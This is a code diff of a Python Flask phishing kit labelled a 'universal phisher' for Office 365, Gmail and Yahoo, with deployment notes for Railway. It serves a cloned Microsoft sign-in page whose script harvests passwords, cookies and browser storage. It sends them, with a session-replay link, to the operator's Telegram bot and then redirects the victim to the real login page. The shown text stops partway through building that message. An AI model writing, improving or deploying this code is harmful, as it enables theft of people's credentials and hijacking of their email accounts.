@@ -1,69 +1,175 @@
+
 #!/usr/bin/env python3
 """
-🔥 M365/GMAIL/OUTLOOK/YAHOO UNIVERSAL PHISHER w/ ONE-CLICK SESSION REPLAY
-Railway Deploy: requirements.txt + Procfile + this app.py
+🔥 M365/GMAIL/OUTLOOK UNIVERSAL PHISHER w/ ONE-CLICK SESSION REPLAY
+Deploy: Railway + Procfile(gunicorn app:app) + TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID
 """
 
 import os
-import re
-import urllib.parse
-from datetime import datetime
-from flask import Flask, request
+from flask import Flask, request, jsonify
 import requests
+import urllib.parse
+import re
+from datetime import datetime
 
 app = Flask(__name__)
 
-# CONFIG - Set in Railway ENV
+# 🔧 CONFIG (Railway ENV vars)
 TELEGRAM_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')
 
-PROVIDERS = {
+# 🎯 PROVIDER COOKIE TARGETS
+PROVIDER_CONFIG = {
     'office': {
-        'emoji': '🔴', 'name': 'Office365/Outlook', 'url': 'https://outlook.office.com/mail/inbox',
-        'cookies': ['ESTSAUTH','ESTSAUTHPERSISTENT','MUID','MSID','x-ms-gateway-slice','cL','MSFPC']
+        'name': '🔴 Office365/Outlook',
+        'url': 'https://outlook.office.com/mail/inbox',
+        'cookies': ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'MUID', 'MSID', 'x-ms-gateway-slice', 'cL', 'MSFPC']
     },
     'gmail': {
-        'emoji': '🟢', 'name': 'Gmail', 'url': 'https://mail.google.com/mail/u/0/#inbox',
-        'cookies': ['SID','HSID','SSID','APISID','SAPISID','GMAIL_AT','NID']
+        'name': '🟢 Gmail', 
+        'url': 'https://mail.google.com/mail/u/0/#inbox',
+        'cookies': ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'GMAIL_AT', 'NID']
     },
     'yahoo': {
-        'emoji': '🟡', 'name': 'Yahoo', 'url': 'https://mail.yahoo.com',
-        'cookies': ['T','Y','B','A3']
+        'name': '🟡 Yahoo',
+        'url': 'https://mail.yahoo.com',
+        'cookies': ['T', 'Y', 'B']
     }
 }
 
 def send_telegram(msg):
+    """Send to Telegram"""
     if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
         try:
-            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
-                         data={'chat_id':TELEGRAM_CHAT_ID, 'text':msg, 'parse_mode':'HTML'})
-        except: pass
+            requests.post(
+                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                data={
+                    'chat_id': TELEGRAM_CHAT_ID,
+                    'text': msg,
+                    'parse_mode': 'HTML',
+                    'disable_web_page_preview': True
+                }
+            )
+        except:
+            pass
 
-def detect_provider(email, cookies):
-    cookies_set = set(cookies.keys())
-    for key, config in PROVIDERS.items():
-        if cookies_set & set(config['cookies']):
-            return key
-    if 'gmail.com' in email.lower(): return 'gmail'
-    if any(d in email.lower() for d in ['yahoo.com','ymail.com']): return 'yahoo'
-    return 'office'
+def detect_provider(email, cookies_dict):
+    """Auto-detect email provider"""
+    email_lower = email.lower()
+    
+    # Office365/Outlook cookies
+    if any(k in cookies_dict for k in PROVIDER_CONFIG['office']['cookies']):
+        return 'office'
+    
+    # Gmail cookies  
+    if any(k in cookies_dict for k in PROVIDER_CONFIG['gmail']['cookies']):
+        return 'gmail'
+    
+    # Domain-based
+    if any(domain in email_lower for domain in ['yahoo.com', 'ymail.com']):
+        return 'yahoo'
+    elif any(domain in email_lower for domain in ['outlook.com', 'hotmail.com', 'live.com']):
+        return 'office'
+    elif 'gmail.com' in email_lower:
+        return 'gmail'
+    
+    return 'office'  # Default to Office
 
 @app.route('/')
 def index():
-    return '''<!DOCTYPE html>
-<html><head><title>Microsoft Sign In</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>body{{margin:0;padding:0;background:#f3f2f1;font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif}}
-.login{{max-width:400px;margin:80px auto;padding:40px 40px 20px;background:#fff;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,.1)}}
-.logo{{width:220px;margin:0 auto 30px;display:block}}
-h1{{color:#106ebe;font-size:24px;font-weight:400;text-align:center;margin:0 0 25px}}
-input{{width:100%;padding:14px;margin-bottom:16px;border:1px solid #edebe9;border-radius:3px;box-sizing:border-box;font-size:16px}}
-input:focus{{outline:none;border-color:#106ebe;box-shadow:0 0 0 2px rgba(16,110,190,.2)}}
-.btn{{width:100%;padding:14px;background:#106ebe;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:600;cursor:pointer}}
-.btn:hover{{background:#005a9e}}
-.loading{{display:none;text-align:center;color:#666;padding:20px}}.loading::after{{content:"⏳ Redirecting to Microsoft...";}}</style></head>
-<body><div class="login">
-<img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjIwIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMjIwIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik0xMiAxMiBDMTIuNTUxNyAxMiAxMy4xMDIzIDEyLjA5OTcgMTMuNjM5NSAxMi4yOTY0IEMxNCAxMi40OTMgMTQuMzQ3IDEyLjg1NjMgMTQuNjUyIDEzLjIzNDMgQzE0Ljk1NzMgMTMuNjEyIDIxLjI4IDE5LjI0IDE4LjY5IDEyMS4yNCAxOC4yOTYgMTIyLjEzIDE3LjY4IDEyMi43IDE3LjA3IDEyMi44MyBDMTYuNDYgMTIzIDE1Ljk4IDEyMi45IDE1LjM1IDEyMi43IEMxNC43MiAxMi40NSAxNC4wNiAxMS45OSAxMy42IDEyLjA1IEMxMy4xNDEgMTIuMTEgMTIuNDQ1IDEyLjE5IDEyLjA0NSAxMi4zMiBDMTEuNjQ1IDEyLjQ1IDExLjI1IDEyLjY5IDExLjA1IDEzLjA1IEMxMC44NSAxMy40MSAxMC44IDEzLjg5IDExLjA1IDE0LjI1IEMxMS4yIDE0LjYxIDExLjY1IDE0Ljg1IDExLjg1IDE0LjkgQzEyLjA1IDE1LjA1IDEyLjM1IDE1LjEgMTIuNTUgMTUuMTMgQzEyLjc1IDE1LjE1IDEzLjA1IDE1LjA1IDEzLjE1IDE0Ljg1IEMxMy4yNSAxNC42NSAxMy4xNSAxNC40NSAxMy4wNSAxNC4yNSBDMTIuOTUgMTQuMDUgMTIuNjUgMTQuMDEgMTIuNDUgMTQuMDMgQzEyLjI1IDE0LjA1IDEyLjA1IDE0LjE1IDEyLjA1IDE0LjI1IEMxMi4wNSAxNC4zNSAxMi4xNSAxNC40NSAxMi4zNSAxNC41NSBDMTIuNTUgMTQuNjUgMTIuODUgMTQuNzUgMTMuMTUgMTQuOCBDMTMuNDUgMTQuODUgMTMuNzUgMTQuODUgMTQuMDUgMTQuNzUgQzE0LjM1IDE0LjY1IDE0LjY1IDE0LjQ1IDE0Ljg1IDE0LjE1IEMxNS4wNSAxMy44NSAxNS4xNSAxMy41NSAxNS4xNSAzMy41NSBDMTUuMTUgNTEuNTUgMTUuMDUgNTIuMDUgMTQuODUgNTIuMjUgQzE0LjY1IDUyLjQ1IDE0LjM1IDUyLjQ1IDE0LjA1IDUyLjM1IEMxMy43NSAyMi4zNSAxMy40NSA0OS4zNSAxMy4xNSA0OS4wNSBDMTIuODUgNDguNzUgMTIuNTUgNDguNTUgMTIuMjUgNDguNDUgQzExLjk1IDQ4LjM1IDExLjY1IDQ4LjM1IDExLjM1IDQ4LjQ1IEMxMS4wNSA0OC41NSAxMC44NSA0OC42NSAxMC42NSA0OC44NSBDMTAuMzUgNDkuMDUgMTAuMzUgNDkuNDUgMTAuNDUgNDkuODUgQzEwLjU1IDUwLjI1IDExLjA1IDUwLjQ1IDExLjM1IDUwLjQ1IEMxMS42NSA1MC40NSAxMS45NSA1MC4zNSAxMi4xNSA1MC4xNSBDMTIuMzUgNDkuOTUgMTIuNDUgNDkuNzUgMTIuNDUgNDkuNDUgQzEyLjQ1IDQ5LjE1IDEyLjM1IDQ4Ljg1IDEyLjE1IDQ4LjY1IEMxMS45NSA0OC40NSAxMS42NSA0OC4zNSAxMS4zNSA0OC4yNSBDMTEuMDUgNDguMTUgMTAuNzUgNDguMTUgMTAuNDUgNDguMjUgQzEwLjE1IDQ4LjM1IDkuODUgNDguNTUgOS42NSA0OC44NSBDOS40IDQ5LjE1IDkuMzUgNDkuNTUgOS40NSA0OS45NSBDOS41NSA1MC4zNSAxMC4wNSA1MC41NSAxMC4zNSA1MC41NSBDMTAuNjUgNTAuNTUgMTAuOTUgNTAuNDMgMTEuMTUgNTAuMzMgQzExLjM1IDUwLjIzIDExLjQ1IDUwLjA1IDExLjQ1IDQ5Ljg1IEMxMS40NSA0OS42NSAxMS4zNSA0OS40NSAxMS4xNSA0OS4yNSBDMTAuOTUgNDkuMDUgMTAuNjUgNDkuMDEgMTAuNDEgNDkuMDMgQzEwLjE3IDQ5LjA1IDEwLjA1IDQ5LjE1IDEwLjA1IDQ5LjI1IEMxMC4wNSA0OS4zNSAxMC4xNSA0OS40NSAxMC4zNSA0OS41NSBDMTAuNTUgNDkuNjUgMTAuODUgNDkuNzUgMTEuMTUgNDkuOCBDMTEuNDUgNDkuODUgMTEuNzUgNDkuODUgMTIuMDUgNDkuNzUgQzEyLjM1IDQ5LjY1IDEyLjY1IDQ5LjQ1IDEyLjg1IDQ5LjE1IEMxMy4wNSA0OC44NSAxMy4xNSA0OC41NSAxMy4xNSA0OC4yNSBDMTMuMTUgNDcuOTUgMTMuMDUgNDcuNjUgMTIuODUgNDcuMzUgQzEyLjY1IDQ3LjA1IDEyLjM1IDQ2Ljg1IDEyLjA1IDQ2LjY1IEMxMS43NSA0Ni40NSAxMS40NSA0Ni4zNSAxMS4xNSA0Ni4yNSBDMTAuODUgNDYuMTUgMTAuNTUgNDYuMTUgMTAuMjUgNDYuMjUgQzkuOTUgNDYuMzUgOS42NSA0Ni41NSA5LjM2IDQ2Ljg1IEM5LjA2IDQ3LjE1IDguOTYgNDcuNTUgOS4wNiA0Ny45NSBDOS4xNiA0OC4zNSA5LjY2IDQ4LjU1IDkuOTYgNDguNTUgQzEwLjI2IDQ4LjU1IDEwLjU2IDQ4LjQ1IDEwLjg2IDQ4LjI1IEMxMS4xNiA0OC4wNSAxMS4yNiA0Ny44NSAxMS4yNiA0Ny41NSBDMTEuMjYgNDcuMjUgMTEuMTYgNDYuOTUgMTEuMDAgNDYuNzUgQzEwLjg0IDQ2LjU1IDEwLjY0IDQ2LjQ1IDEwLjM0IDQ2LjM1IEMxMC4wNCA0Ni4yNSA5Ljc0IDQ2LjI1IDkuNDQgNDYuMzUgQzkuMTQgNDYuNDUgOC44NCA0Ni42NSA4LjU0IDQ2Ljg1IEM4LjI0IDQ3LjA1IDguMTQgNDcuNDUgOC4yNCA0Ny44NSBDOC4zNCA0OC4yNSA4Ljg0IDQ4LjQ1IDkuMTQgNDguNDUgQzkuNDQgNDguNDUgOS43NCA0OC4zNSAxMC4wNCA0OC4xNSBDMTAuMzQgNDcuOTUgMTAuNDQgNDcuNzUgMTAuNDQgNDcuNDUgQzEwLjQ0IDQ3LjE1IDEwLjM0IDQ2Ljg1IDEwLjE0IDQ2LjY1IEM5Ljg0IDQ2LjQ1IDkuNTQgNDYuMzUgOS4yNCA0Ni4yNSBDOC45NCA0Ni4xNSA4LjY0IDQ2LjE1IDguMzQgNDYuMjUgQzggNDYuMzUgNy43IDQ2LjU1IDcuNDYgNDYuODUgQzcuMTYgNDcuMTUgNy4wNiA0Ny41NSA3LjE2IDQ3Ljk1IEM3LjI2IDQ4LjM1IDcuNzYgNDguNTUgOC4wNiA0OC41NSBDOC4zNiA0OC41NSA4LjY2IDQ4LjQ1IDguOTYgNDguMjUgQzkuMjYgNDguMDUgOS4zNiA0Ny44NSA5LjM2IDQ3LjU1IEM5LjM2IDQ3LjI1IDkuMjYgNDYuOTUgOS4xMCA0Ni43NSBDOC45NCA0Ni41NSA4Ljc0IDQ2LjQ1IDguNDQgNDYuMzUgQzguMTQgNDYuMjUgNy44NCA0Ni4yNSA3LjU0IDQ2LjM1IEM3LjI0IDQ2LjQ1IDYuOTQgNDYuNjUgNi42NCA0Ni44NSBDNi4zNCA0Ny4wNSA2LjI0IDQ3LjQ1IDYuMzQgNDcuODUgQzYuNDQgNDguMjUgNi45NCA0OC40NSA3LjI0IDQ4LjQ1IEM3LjU0IDQ4LjQ1IDcuODQgNDguMzUgOC4xNCA0OC4xNSBDOC40NCA0Ny45NSA4LjU0IDQ3Ljc1IDguNTQgNDcuNDUgQzg4LjU0IDQ3LjE1IDguNDQgNDYuODUgOC4yNCA0Ni42NSBDNy45NCA0Ni40NSA3LjY0IDQ2LjM1IDcuMzQgNDYuMjUgQzcgNDYuMTUgNi43IDQ2LjE1IDYuNCA0Ni4yNSBDNi4xIDQ2LjM1IDUuODEgNDYuNTUgNS41MSA0Ni43NSBDNS4yMSA0Ny4wNSA1LjExIDQ3LjQ1IDUuMjEgNDcuODUgQzUuMzEgNDguMjUgNS44MSA0OC40NSA2LjExIDQ4LjQ1IEM2LjQxIDQ4LjQ1IDYuNzEgNDguMzUgNi45NCA0OC4xNSBDNy4yNCA0Ny45NSA3LjM0IDQ3Ljc1IDcuMzQgNDcuNDUgQzc3LjM0IDQ3LjE1IDcuMjQgNDYuODUgNy4wNCA0Ni42NSBDNi43NCA0Ni40NSA2LjQ0IDQ2LjM1IDYuMTQgNDYuMjUgQzUuODQgNDYuMTUgNS41NCA0Ni4xNSA1LjI0IDQ2LjI1IEM0Ljg0IDQ2LjM1IDQuNjQgNDYuNTUgNC4zNCA0Ni43NSBDNC4wNCA0Ny4wNSA0LjE0IDQ3LjQ1IDQuMjQgNDcuODUgQzQuMzQgNDguMjUgNC44NCA0OC40NSA1LjE0IDQ4LjQ1IEM1LjQ0IDQ4LjQ1IDUuNzQgNDguMzUgNS45OSA0OC4xNSBDNi4yNCA0Ny45NSA2LjM0IDQ3Ljc1IDYuMzQgNDcuNDUgQzYuMzQgNDcuMTUgNi4yNCA0Ni44NSA2LjA0IDQ2LjY1IEM1Ljc0IDQ2LjQ1IDUuNDQgNDYuMzUgNS4xNCA0Ni4yNSBDNC44NCA0Ni4xNSA0LjU0IDQ2LjE1IDQuMjQgNDYuMjUgQzMuOTQgNDYuMzUgMy42NCA0Ni41NSAzLjM0IDQ2Ljc1IEMzLjA0IDQ3LjA1IDIuOTQgNDcuNDUgMy4wNCA0Ny44NSBDMy4xNCA0OC4yNSAzLjY0IDQ4LjQ1IDMuOTQgNDguNDUgQzQuMjQgNDguNDUgNC41NCA0OC4zNSA0Ljg0IDQ4LjE1IEM1LjE0IDQ3Ljk1IDUuMjQgNDcuNzUgNS4yNCA0Ny40NSBDNS4yNCA0Ny4xNSA1LjE0IDQ2Ljg1IDQuOTQgNDYuNjUgQzQuNjQgNDYuNDUgNC4zNCA0Ni4zNSA0LjA0IDQ2LjI1IEMzLjc0IDQ2LjE1IDMuNDQgNDYuMTUgMy4xNCA0Ni4yNSBDMi44NCA0Ni4zNSAyLjU0IDQ2LjU1IDIuMjQgNDYuNzUgQzEuOTQgNDcuMDUgMS44NCA0Ny40NSAxLjk0IDQ3Ljg1IEMyLjA0IDQ4LjI1IDIuNTQgNDguNDUgMi44NCA0OC40NSBDMy4xNCA0OC40NSA0LjQ0IDQ4LjM1IDQuNzQgNDguMTUgQzUuMDQgNDcuOTUgNS4xNCA0Ny43NSA1LjE0IDQ3LjQ1IEM1LjE0IDQ3LjE1IDUuMDQgNDYuODUgNC44NCA0Ni42NSBDNC41NCA0Ni40NSA0LjI0IDQ2LjM1IDMuOTA=>
-<h1>Sign in to your account</h1>
-<form id="form"><input type="email" id="username" placeholder="Email, phone, or Skype" required>
-<input type="password
+    """Phishing page (M365 replica - replace with your HTML)"""
+    return """
+<!DOCTYPE html>
+<html>
+<head><title>Microsoft Sign In</title></head>
+<body style="background:#f0f0f0;font-family:Segoe UI">
+<div style="max-width:400px;margin:100px auto;padding:40px;background:white;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1)">
+    <img src="https://login.microsoftonline.com/common/images/logo.png" style="width:200px;margin-bottom:30px">
+    <h2 style="color:#0078d4;margin-bottom:20px">Sign in to your account</h2>
+    <form id="loginForm" style="width:100%">
+        <input type="email" id="username" placeholder="Email or phone" 
+               style="width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;margin-bottom:15px;box-sizing:border-box" required>
+        <input type="password" id="password" placeholder="Password" 
+               style="width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;margin-bottom:20px;box-sizing:border-box" required>
+        <button type="submit" style="width:100%;padding:12px;background:#0078d4;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer">Sign in</button>
+    </form>
+    <script>
+        document.getElementById('loginForm').onsubmit = async (e) => {{
+            e.preventDefault();
+            
+            // 🎣 HARVEST EVERYTHING
+            const harvest = {{
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                cookies: document.cookie,
+                ua: navigator.userAgent,
+                screen: `${{screen.width}}x${{screen.height}}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
+                sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)))
+            }};
+            
+            // 📤 SEND TO HARVEST
+            await fetch('/harvest', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify(harvest)
+            }});
+            
+            // ⏳ 3.5s → LEGIT REDIRECT
+            setTimeout(() => {{
+                window.location.href = 'https://login.microsoftonline.com';
+            }}, 3500);
+        }};
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/harvest', methods=['POST'])
+def harvest():
+    """🎣 MAIN HARVEST ENDPOINT"""
+    try:
+        data = request.get_json() or {}
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        email = data.get('username', 'N/A')
+        pwd = data.get('password', 'N/A')
+        cookies_raw = data.get('cookies', '')
+        
+        # 🍪 PARSE COOKIES
+        cookies_dict = {}
+        for c in cookies_raw.split(';'):
+            if '=' in c:
+                name, value = c.strip().split('=', 1)
+                cookies_dict[name] = value.strip()
+        
+        # 🔍 DETECT PROVIDER
+        provider_key = detect_provider(email, cookies_dict)
+        provider_config = PROVIDER_CONFIG[provider_key]
+        
+        # 🎯 EXTRACT CRITICAL COOKIES
+        critical_cookies = {}
+        for cookie_name in provider_config['cookies']:
+            if cookie_name in cookies_dict:
+                critical_cookies[cookie_name] = cookies_dict[cookie_name]
+        
+        # 📋 EXPORT STRING
+        cookie_export = "; ".join([f"{k}={v}" for k,v in critical_cookies.items()])
+        
+        # 📊 STATS
+        critical_count = len(critical_cookies)
+        total_cookies = len(cookies_dict)
+        
+        # 🪵 CONSOLE LOG
+        log_msg = f"🎣 [{datetime.now()}] {ip} | {email} | {provider_config['name']} | {critical_count}/{len(provider_config['cookies'])} cookies"
+        print(log_msg)
+        
+        # 🚀 TELEGRAM MESSAGE w/ ONE-CLICK
+        replay_url = f"https://{request.host}/replay?cookies={urllib.parse.quote(cookie_export)}&target={urllib.parse.quote(provider_config['url'])}"
+        
+        tmsg = f"""🔥 <b>📧 EMAIL SESSION CAPTURED!</b> {provider_config['name']}
+
+👤 <code>{email}</code>
+🔑 <code>{pwd}</code>
+
+🍪 <b>CRITICAL COOKIES ({critical_count}/{len(provider_config['cookies'])}):</b>
